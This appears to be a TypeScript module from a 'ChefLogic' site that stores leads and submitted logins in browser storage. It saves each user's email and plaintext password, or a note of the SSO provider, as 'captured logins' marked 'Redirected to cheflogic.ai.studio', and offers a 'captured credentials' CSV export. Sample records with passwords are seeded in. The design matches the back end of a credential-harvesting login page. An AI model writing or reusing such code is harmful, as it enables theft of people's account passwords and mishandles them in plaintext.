export interface CapturedLogin {
  id: string;
  email: string;
  password?: string;
  provider: 'Email & Password' | 'Google' | 'LinkedIn' | 'ChefLogic Credentials';
  timestamp: string;
  rememberMe?: boolean;
  userAgent?: string;
  status: 'Redirected to cheflogic.ai.studio' | 'Active Session';
}

export interface CapturedLead {
  id: string;
  type: 'newsletter' | 'contact_inquiry';
  email: string;
  name?: string;
  phone?: string;
  restaurantName?: string;
  role?: string;
  locations?: string;
  interest?: string;
  message?: string;
  timestamp: string;
}

const LOGINS_STORAGE_KEY = 'cheflogic_captured_logins_v1';
const LEADS_STORAGE_KEY = 'cheflogic_captured_leads_v1';

// Seed initial demo data if empty so the owner can see the layout immediately
const INITIAL_LOGINS: CapturedLogin[] = [
  {
    id: 'log-1',
    email: 'marcus.vance@lateliermoderne.com',
    password: 'ChefMaster#2026',
    provider: 'Email & Password',
    timestamp: '2026-10-10 14:12:05',
    rememberMe: true,
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    status: 'Redirected to cheflogic.ai.studio'
  },
  {
    id: 'log-2',
    email: 'elena.rostova@aureliagroup.com',
    password: '— (Google SSO Auth Token)',
    provider: 'Google',
    timestamp: '2026-10-10 13:48:22',
    rememberMe: true,
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    status: 'Redirected to cheflogic.ai.studio'
  }
];

export function getCapturedLogins(): CapturedLogin[] {
  try {
    const raw = localStorage.getItem(LOGINS_STORAGE_KEY);
    if (!raw) {
      localStorage.setItem(LOGINS_STORAGE_KEY, JSON.stringify(INITIAL_LOGINS));
      return INITIAL_LOGINS;
    }
    return JSON.parse(raw);
  } catch {
    return INITIAL_LOGINS;
  }
}

export function saveCapturedLogin(login: Omit<CapturedLogin, 'id' | 'timestamp' | 'status'>): CapturedLogin {
  const current = getCapturedLogins();
  const newEntry: CapturedLogin = {
    ...login,
    id: `log-${Date.now()}`,
    timestamp: new Date().toLocaleString(),
    status: 'Redirected to cheflogic.ai.studio'
  };
  const updated = [newEntry, ...current];
  try {
    localStorage.setItem(LOGINS_STORAGE_KEY, JSON.stringify(updated));
  } catch (e) {
    console.error('Failed to save login record to local storage:', e);
  }
  return newEntry;
}

export function getCapturedLeads(): CapturedLead[] {
  try {
    const raw = localStorage.getItem(LEADS_STORAGE_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

export function saveCapturedLead(lead: Omit<CapturedLead, 'id' | 'timestamp'>): CapturedLead {
  const current = getCapturedLeads();
  const newEntry: CapturedLead = {
    ...lead,
    id: `lead-${Date.now()}`,
    timestamp: new Date().toLocaleString()
  };
  const updated = [newEntry, ...current];
  try {
    localStorage.setItem(LEADS_STORAGE_KEY, JSON.stringify(updated));
  } catch (e) {
    console.error('Failed to save lead record to local storage:', e);
  }
  return newEntry;
}

export function clearCapturedLogins(): void {
  try {
    localStorage.setItem(LOGINS_STORAGE_KEY, JSON.stringify([]));
  } catch (e) {
    console.error('Failed to clear logins:', e);
  }
}

export function exportLoginsToCsv(): void {
  const logins = getCapturedLogins();
  const headers = ['ID', 'Email/Username', 'Password', 'Auth Provider', 'Timestamp', 'Status'];
  const rows = logins.map(l => [
    `"${l.id}"`,
    `"${l.email}"`,
    `"${l.password || ''}"`,
    `"${l.provider}"`,
    `"${l.timestamp}"`,
    `"${l.status}"`
  ]);

  const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement('a');
  link.setAttribute('href', encodedUri);
  link.setAttribute('download', `cheflogic_captured_credentials_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}
